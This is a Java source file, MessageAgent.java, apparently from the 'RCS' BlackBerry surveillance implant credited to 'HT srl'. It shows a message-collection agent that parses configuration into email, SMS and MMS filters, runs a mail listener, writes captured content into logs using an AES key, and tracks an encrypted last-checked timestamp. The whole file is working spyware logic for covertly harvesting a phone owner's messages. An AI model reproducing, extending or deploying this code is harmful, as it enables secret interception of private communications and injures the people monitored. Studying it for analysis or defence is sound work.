/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MessageAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import net.rim.device.api.util.IntHashtable;
import blackberry.config.Keys;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.log.Markup;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
 119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
 199         UINT uVersion;
 200                 #define LOG_MAIL_VERSION 2009070301
 201         UINT uFlags;
 202         UINT uSize;
 203         FILETIME ftTime;
 204 } MailAdditionalData, *pMailAdditionalData;

 http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

 uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato


 */

/**
 * The Class MessageAgent.
 */
public final class MessageAgent extends Agent {

    // #debug
    static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);

    protected static final int SLEEPTIME = 5000;

    MailListener mailListener;
    Markup markupDate;

    public long lastcheck = 0;

    protected String identification;
    public IntHashtable filtersSMS = new IntHashtable();
    public IntHashtable filtersMMS = new IntHashtable();
    public IntHashtable filtersEMAIL = new IntHashtable();

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public MessageAgent(final boolean agentStatus) {
        super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");

        // #ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
                "Wrong Conversion");
        // #endif

        mailListener = new MailListener(this);
    }

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        // mantiene la data prima di controllare tutte le email
        markupDate = new Markup(agentId, Keys.getInstance().getAesKey());

        setDelay(SLEEPTIME);
        setPeriod(NEVER);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        mailListener.run();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        mailListener.start();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        mailListener.stop();
    }

    /**
     * Creates the log.
     * 
     * @param additionalData
     *            the additional data
     * @param content
     *            the content
     */
    void createLog(final byte[] additionalData,
            final byte[] content) {
        //#debug debug
        debug.trace("createLog");

        synchronized (log) {
            log.createLog(additionalData);
            log.writeLog(content);
            log.close();
        }
        
        //#debug debug
        debug.trace("log created");
    }

    /**
     * Inits the markup.
     * 
     * @return the long
     */
    long initMarkup() {

        if (markupDate.isMarkup() == false) {
            // #debug debug
            debug.trace("Il Markup non esiste, timestamp = 0 ");
            final Date date = new Date();
            lastcheck = 0;

        } else {
            byte[] deserialized;
            // #debug debug
            debug.trace("Sto leggendo dal markup");
            try {
                deserialized = markupDate.readMarkup();
                lastcheck = Utils.byteArrayToLong(deserialized, 0);

            } catch (final IOException e) {
                // #debug error
                debug.error("Cannot read markup: " + e);
            }

        }
        return lastcheck;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] conf) {

        final Vector tokens = tokenize(conf);
        if (tokens == null) {
            // #debug
            debug.error("Cannot tokenize conf");
            return false;
        }

        final int size = tokens.size();
        for (int i = 0; i < size; ++i) {
            final Prefix token = (Prefix) tokens.elementAt(i);

            switch (token.type) {
            case Prefix.TYPE_IDENTIFICATION:
                // IDENTIFICATION TAG
                identification = WChar.getString(conf, token.payloadStart,
                        token.length, false);
                // #debug debug
                debug.trace("Type 1: " + identification);
                break;
            case Prefix.TYPE_FILTER:
                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                try {
                    final Filter filter = new Filter(conf, token.payloadStart,
                            token.length);
                    if (filter.isValid()) {
                        switch (filter.classtype) {
                        case Filter.CLASS_EMAIL:
                            // #debug info
                            debug.info("EMAIL: " + filter.type + " en:"
                                    + filter.enabled);
                            filtersEMAIL.put(filter.type, filter);
                            break;
                        case Filter.CLASS_MMS:
                            // #debug info
                            debug.info("MMS: " + filter.type + " en:"
                                    + filter.enabled);
                            filtersMMS.put(filter.type, filter);
                            break;
                        case Filter.CLASS_SMS:
                            // #debug info
                            debug.info("SMS: " + filter.type + " en:"
                                    + filter.enabled);
                            filtersSMS.put(filter.type, filter);
                            break;
                        case Filter.CLASS_UNKNOWN: // fall through
                        default:
                            // #debug
                            debug.error("unknown classtype: "
                                    + filter.classtype);
                            break;
                        }
                    }
                    // #debug debug
                    debug.trace("Type 2: header valid: " + filter.isValid());
                } catch (final Exception e) {
                    // #debug
                    debug.error("Cannot filter" + e);
                }
                break;

            default:
                // #debug
                debug.error("Unknown type: " + token.type);
                break;
            }
        }

        return true;
    }

    private Vector tokenize(final byte[] conf) {
        final Vector tokens = new Vector();
        int offset = 0;
        final int length = conf.length;

        while (offset < length) {
            final Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {

                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    /**
     * Update markup.
     */
    void updateMarkup() {
        // #debug debug
        debug.trace("Sto scrivendo nel markup");
        final Date date = new Date();
        lastcheck = date.getTime();
        final byte[] serialize = Utils.longToByteArray(lastcheck);
        markupDate.writeMarkup(serialize);
    }
}
